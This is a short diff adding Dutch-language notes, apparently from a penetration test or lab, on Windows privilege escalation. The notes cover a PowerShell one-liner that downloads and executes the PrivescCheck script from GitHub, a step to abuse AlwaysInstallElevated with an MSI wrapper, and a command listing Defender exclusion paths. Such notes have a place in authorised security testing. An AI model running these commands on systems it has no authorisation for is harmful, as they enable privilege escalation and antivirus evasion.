@@ -1,0 +1,9 @@
+Stap 1: Open PowerShell en voer volgende command in
+
+iex((new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1'))
+
+Invoke-PrivescCheck
+
+Stap 2: Check naar de vulnerabilities - als AlwaysInstallElevated aan staat --> MSI wrapper draaien
+
+Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
